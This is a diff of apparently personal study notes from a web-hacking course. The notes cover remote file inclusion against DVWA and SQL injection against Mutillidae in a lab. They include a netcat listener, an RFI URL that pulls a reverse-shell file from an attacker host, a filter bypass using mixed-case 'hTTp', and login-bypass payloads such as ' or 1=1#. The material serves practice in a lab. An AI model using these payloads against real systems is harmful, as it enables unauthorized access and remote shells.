@@ -278,6 +278,7 @@ on ur computer -> var -> www -> html and save the file
 - in the attacker terminal cmd -> nc -vv -l -p 8000
 - in the browser URL -> 10.0.2.4/dvwa/vulnerabilities/fi/?page=http://attacker_ip:running_port_for_SimpleHTTPServer/reverse.txt?
 
+Step 3 -> Switch security to medium
 But now if we switch the security to medium the above attack will not work as the filter is applied as it is for http hence we
 will just convert http to hTTP as ->
 10.0.2.4/dvwa/vulnerabilities/fi/?page=hTTp://attacker_ip:running_port_for_SimpleHTTPServer/reverse.txt?
@@ -288,8 +289,8 @@ To prevent Remote File Inclusion ->
 https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6019278#overview
 
 #(05) SQL Injections ->
-To access the database on the Metasploitable machine cmd -> mysql -u root -h ip_of_metasploit // this not hacking it is simple
-access as the metasploit does not use any password for the 'root' we can access it easily
+To access the database on the Metasploitable machine, cmd in attacker terminal -> mysql -u root -h ip_of_metasploit // this not
+hacking it is simple access as the metasploit does not use any password for the 'root' we can access it easily
 cmds of SQL -> show databases;
 use database_name
 show tables;
@@ -298,12 +299,14 @@ select * from table_name;
 Sql Injections r very hard to protect against and they give u access to database and most of the times u really don't need to get
 reverse connections etc, Sql injections works in the same way as if u don't have the access to the database u wants to attack but 
 can do sql injection on the other database in which is on the same server then u can exploit other database to So basically Sql
-Injections can be used as File inclusion vurnebilities and File upload vulnebilities
+Injections can be used as File inclusion vurnebilities and File upload vulnebilities, Screenshot(473)
 
+Step 1 ->
 To Discovery Sql Injections u need to browse through ur target and try to break each page, So when ever u see a text box or a 
 parameter for example -> http://target.com/page.php?something=something, then try to inject stuff here try to use a ''' single quote
 try to use an 'and' or the 'orderby'
 
+Step 2 ->
 Steps go to Mutillade in metasploit and go to it's login page register ur self and then login then see and logout
 - On the login page try to inject in the Name and Password textbox as ur username and ''' single quote in password and u will see
 an error is displayed which looks like a database error, and usally the error is not that much informative like this it would be
@@ -312,6 +315,7 @@ changing
 Now in the Error section which occured look into the Diagnotic Information and u will see the sql statement which is tried to be
 executed
 
+Step 3 ->
 Now lets check if we can inject the code again, So enter the username and then in password enter as ur password with ''' single 
 quote like (123456') // we added a single quote bcz if we look in the statement ->
 SELECT * FROM accounts WHERE username='Sadanand' AND password=''' ,So
@@ -324,6 +328,7 @@ vulnerability for the sql injection lets try other string in password field as -
 given u authentication error even on giving right password and username
 So it basically means that I can put any code here as like -> 123456' ANY_CODE_HERE #
 
+Step 3 ->
 By Passing Login with SQL Injection -> Now lets take the username as 'admin' and in the password as -> random_string or 1=1 #
 in the above case the statement which is going to be get executed is
 SELECT * FROM accounts WHERE username='admin' AND password='aaa' or 1=1#' // here 'or' is going to neglect the 'and'
@@ -331,10 +336,12 @@ and now u will see that I am able to login without the password
 By passing of logins can be done in the many ways it depends on the code written on the page and on ur imagination that how the code
 is written as in the above section we actually comes to know the code
 
+Step 4 ->
 Another way of bypassing instead of injecting the code in password like above we try to inject the code in Username as
 -> admin' # // So my statement looks like this SELECT * FROM accounts WHERE username='admin' #' AND password='$PASSWORD'
 Now u will see u manage to login
 
+Step 5->
 ByPassing More Secure Logins -> on the mutilliadae toggle the security to Arrogant level 1 and now u will see that the above sql
 injection attacks won't work, now this filtering could be happening at the client side or the server side
 If it is happening at the client side then the filtering would be happening before it is being sent to server
